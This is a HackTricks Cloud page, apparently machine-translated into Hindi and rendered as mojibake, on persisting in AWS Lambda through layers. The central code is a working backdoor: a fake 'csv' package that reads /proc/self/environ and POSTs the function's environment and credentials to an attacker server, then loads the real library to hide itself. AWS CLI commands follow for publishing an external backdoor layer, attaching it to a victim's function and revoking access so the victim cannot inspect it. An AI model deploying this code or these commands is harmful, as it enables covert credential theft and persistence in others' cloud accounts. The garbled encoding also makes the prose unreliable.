# AWS - рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░реНрд╕ рдЯрд┐рдХрд╛рдКрддрд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рддреБрд░рдВрдд** рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛред

</details>

## рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░реНрд╕

рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ рдПрдХ .zip рдлрд╝рд╛рдЗрд▓ рдЖрд░реНрдХрд╛рдЗрд╡ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЛрдб** рдпрд╛ рдЕрдиреНрдп рд╕рд╛рдордЧреНрд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред рдПрдХ рд▓реЗрдпрд░ рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ, [рдХрд╕реНрдЯрдо рд░рдирдЯрд╛рдЗрдо](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), рдбреЗрдЯрд╛ рдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдЖрдк **рдкрд╛рдВрдЪ рд▓реЗрдпрд░реНрд╕ рд╢рд╛рдорд┐рд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм рдЖрдк рдПрдХ рд▓реЗрдпрд░ рдХреЛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **рд╕рд╛рдордЧреНрд░реА рдХреЛ `/opt`** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдирд┐рд╖реНрдХрд░реНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдирд┐рд╖реНрдкрд╛рджрди рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП **рд▓реЗрдпрд░реНрд╕** рдЖрдкрдХреЗ AWS рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рдЬреА** рд╣реЛрддреЗ рд╣реИрдВред рдЖрдк рдПрдХ рд▓реЗрдпрд░ рдХреЛ рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рдХреЗ рд╕рд╛рде **рд╕рд╛рдЭрд╛** рдХрд░рдиреЗ рдпрд╛ рд▓реЗрдпрд░ рдХреЛ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ** рдмрдирд╛рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рди рдПрдХ рдРрд╕реА рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдПрдХ рдЕрд▓рдЧ рдЦрд╛рддрд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рди рд▓реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рддрдХ рдЙрд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рдЬрдм рддрдХ рдЖрдкрдХреА рд▓реЗрдпрд░ рддрдХ рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣рдЯрд╛ рджреА рдЧрдИ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдирдИ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ рдпрд╛ рдбрд┐рд▓реАрдЯ рдХрд┐рдП рдЧрдП рд▓реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рддрд░рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдЖрдк рдЫрд╡рд┐ рдмрдирд╛рддреЗ рд╕рдордп рдЕрдкрдиреЗ рдкрд╕рдВрджреАрджрд╛ рд░рдирдЯрд╛рдЗрдо, рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ рдФрд░ рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддреЗ рд╣реИрдВред

### Python рд▓реЛрдб рдкрде

рд▓реИрдореНрдмрдбрд╛ рдореЗрдВ рдкрд╛рдпрдерди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд▓реЛрдб рдкрде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ **рджреВрд╕рд░реА** рдФрд░ рддреАрд╕рд░реА **рд╕реНрдерд╛рди** рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдВ рдХреИрд╕реЗ рдЖрдкрддреНрддрд┐рдЬрдирдХ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдкрд░ рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдирдЬрд╝рд┐рдк рдХрд░рддреА рд╣реИрдВ: **`/opt/python/lib/python3.9/site-packages`** рдФрд░ **`/opt/python`**

{% hint style="danger" %}
рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд▓реИрдореНрдмрдбрд╛ **рд▓реЗрдпрд░** рдХреЛ **рдмреИрдХрдбреЛрд░** рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдПрдХ рдРрд╕рд╛ рд▓реЗрдпрд░ **рдЬреЛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**, рддреЛ рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ рд▓реИрдореНрдмрдбрд╛ рдЖрд╡рд╛рд╣рди рдХреЗ рд╕рд╛рде рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА рдХреЛрдб рдЪрд▓рд╛ рд╕рдХреЗрдЧрд╛ред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ:

* рдкреАрдбрд╝рд┐рдд рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реА **рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**
* рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ рдХреЗ рд╕рд╛рде рдПрдХ **рдкреНрд░реЙрдХреНрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдмрдирд╛рдПрдВ** рдЬреЛ **рдХрд╕реНрдЯрдо рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдПрдЧреА** рдФрд░ **рдореВрд▓** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░реЗрдЧреАред

### рдкреВрд░реНрд╡-рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝

{% hint style="warning" %}
рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдореБрдЭреЗ рдПрдХ рдХрдард┐рдирд╛рдИ рдорд┐рд▓реА: рдХреБрдЫ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдкрд╛рдпрдерди рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рдЖрдкрдХреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд▓реЛрдб рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ**ред рдореИрдВ `os` рдпрд╛ `sys` рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рдЙрдореНрдореАрдж рдХрд░ рд░рд╣рд╛ рдерд╛, рд▓реЗрдХрд┐рди **рд╣рд╛рд▓рд╛рдВрдХрд┐ `json` рд▓рд╛рдЗрдмреНрд░реЗрд░реА рднреА рд▓реЛрдб рд╣реЛ рдЧрдИ рдереА**ред\
рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реНрдерд╛рдпрд┐рддреНрд╡ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ **рдирдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред
{% endhint %}

рдЗрд╕ рддрд░рд╣ рдХреЗ рдкрд╛рдпрдерди рдХреЛрдб рдХреЗ рд╕рд╛рде, рд▓реИрдореНрдмрдбрд╛ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдХреА **рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
рдФрд░ рдпрд╣ рд╣реИ **рд╕реВрдЪреА** (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ `os` рдпрд╛ `json` рдЬреИрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдореМрдЬреВрдж рд╣реИрдВ)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
рдФрд░ рдпрд╣ рд╣реИ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдХреА рд╕реВрдЪреА рдЬреЛ **рд▓реИрдореНрдмрдбрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ рдмреИрдХрдбреЛрд░рд┐рдВрдЧ

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдорд╛рди рд▓реЗрдВ рдХрд┐ рд▓рдХреНрд╖рд┐рдд рдХреЛрдб **`csv`** рдХреЛ рдЖрдпрд╛рдд рдХрд░ рд░рд╣рд╛ рд╣реИред рд╣рдо **`csv` рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдЖрдпрд╛рдд рдХреЛ рдмреИрдХрдбреЛрд░ рдХрд░рдиреЗ** рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рд▓реИрдореНрдмрдбрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдкрде рдореЗрдВ рдирд┐рд░реНрдорд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛: **`/opt/python/lib/python3.9/site-packages`** рдЬрд╣рд╛рдВ рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓ рд╡рд╛рд▓реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ csv рдмрдирд╛рдиреА рд╣реЛрдЧреА: **`__init__.py`**\
рдлрд┐рд░, рдЬрдм рд▓реИрдореНрдмрдбрд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ **csv** рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рд╣рдорд╛рд░реА **`__init__.py` рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛ рдЬрд╛рдПрдЧреАред\
рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:

* рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ
* рдореВрд▓ csv рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░реЗрдВ

рд╣рдо рджреЛрдиреЛрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
рддреЛ, рдЗрд╕ рдХреЛрдб рдХреЛ **`python/lib/python3.9/site-packages/__init__.py`** рдкрде рдореЗрдВ рд░рдЦрдХрд░ рдПрдХ рдЬрд╝рд┐рдк рдмрдирд╛рдПрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ lambda layer рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред

рдЖрдк рдЗрд╕ рдХреЛрдб рдХреЛ [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor) рдореЗрдВ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХреАрдХреГрдд payload **рдЗрд╕реЗ рдкрд╣рд▓реА рдмрд╛рд░ invoke рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ lambda container рдХреЛ рд░реАрд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** (рдХреЛрдб рдХрд╛ рдкрд░рд┐рд╡рд░реНрддрди рдпрд╛ рдардВрдбреА lambda рдХреЗ рдмрд╛рдж), рд▓реЗрдХрд┐рди **рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ** рднреА рдПрдХреАрдХреГрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### рдмрд╛рд╣рд░реА Layers

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдмрд╛рд╣рд░реА рдЦрд╛рддреЛрдВ рд╕реЗ lambda layers рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ lambda рдПрдХ рдмрд╛рд╣рд░реА рдЦрд╛рддреЗ рд╕реЗ рдПрдХ layer рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрджрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ lambda рдХреЗ рдкрд╛рд╕ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХрддрдо 5 layers рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рддрдХрдиреАрдХ рдХреА рд╡рд┐рд╡рд┐рдзрддрд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдореМрдЬреВрджрд╛ layer рдХреЛ backdoor рдХрд░реЗрдВ (рдХреБрдЫ рдмрд╛рд╣рд░реА рдирд╣реАрдВ рд╣реИ)
* рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ рдПрдХ layer рдмрдирд╛рдПрдВ, рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рдХреЛ layer рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ, рдкреАрдбрд╝рд┐рдд Lambda рдореЗрдВ layer рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрдорддрд┐ рд╣рдЯрд╛ рджреЗрдВред
* **Lambda** рдЕрдм рднреА **layer рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛** рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЛ **layer рдХреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛** (рд▓реИрдореНрдмрдбрд╛ рдореЗрдВ рдПрдХ rev shell рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдЕрд▓рд╛рд╡рд╛)
* рдкреАрдбрд╝рд┐рдд **`aws lambda list-layers`** рдХреЗ рд╕рд╛рде рдмрд╛рд╣рд░реА layers рдирд╣реАрдВ рджреЗрдЦреЗрдЧрд╛

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдлрд╝ рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рддрдХ** рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
